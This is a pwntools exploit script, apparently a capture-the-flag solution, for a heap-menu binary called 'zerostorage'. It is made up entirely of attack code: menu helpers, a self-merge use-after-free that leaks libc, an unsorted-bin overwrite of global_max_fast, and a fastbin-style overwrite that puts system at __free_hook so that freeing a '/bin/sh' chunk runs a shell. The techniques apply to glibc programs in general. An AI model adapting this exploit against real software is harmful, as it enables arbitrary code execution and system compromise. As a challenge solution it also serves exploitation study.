from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ('xfce4-terminal', '-e')

target = process("./zerostorage")
# gdb.attach(target)
raw_input("Begin...")

libc_bin = ELF("./libc.so.6")

def insert(size, data):
    target.recvuntil("choice: ")
    target.sendline("1")
    target.recvuntil("entry: ")
    target.sendline(str(size))
    target.recvuntil("data: ")
    target.sendline(data)

def merge(index1, index2):
    target.recvuntil("choice: ")
    target.sendline("3")
    target.recvuntil("Entry ID: ")
    target.sendline(str(index1))
    target.recvuntil("Entry ID: ")
    target.sendline(str(index2))

def view(index):
    target.recvuntil("choice: ")
    target.sendline("5")
    target.recvuntil("Entry ID: ")
    target.sendline(str(index))
    target.recvline()

def edit(index, size, data):
    target.recvuntil('choice: ')
    target.sendline("2")
    target.recvuntil('ID: ')
    target.sendline(str(index))
    target.recvuntil("entry: ")
    target.sendline(str(size))
    target.recvuntil("data: ")
    target.sendline(data)

def delete(index):
    target.recvuntil('choice: ')
    target.sendline('4')
    target.recvuntil("ID: ")
    target.sendline(str(index))
    
insert(0x20, "A" * 0x1f)        # chunk 0
insert(0xfc, "B" * 0xfb)        # chunk 1
merge(0, 0)
view(2)
leak = u64(target.recv(8))
libc = leak - 0x3c4b78
global_max_fast = libc + 0x3c67f8
system = libc + libc_bin.symbols['system']
free_hook = libc + libc_bin.symbols['__free_hook']

log.info("Leak: " + hex(leak))
log.info("Libc: " + hex(libc))
log.info("Global_max_fast: " + hex(global_max_fast))
log.info("System: " + hex(system))

edit(2, 0x20, b"aaaaaaaa" + p64(global_max_fast-0x10) + b"C"*0xf)
insert(0x20, "/bin/sh\x00" + "D"*0x17)
merge(1, 1)
payload = p64(free_hook - 0x59)
payload += b"A"*(0x1f7 - len(payload))
edit(3, 0x1f8, payload)
insert(0x1f8, "Q"*0x1f7)
payload2 = b"\x00" * 0x49
payload2 += p64(system)
payload2 += b"\x00" * (0x1f7 - len(payload2))
insert(0x1f8, payload2)
delete(0)
# target.interactive()
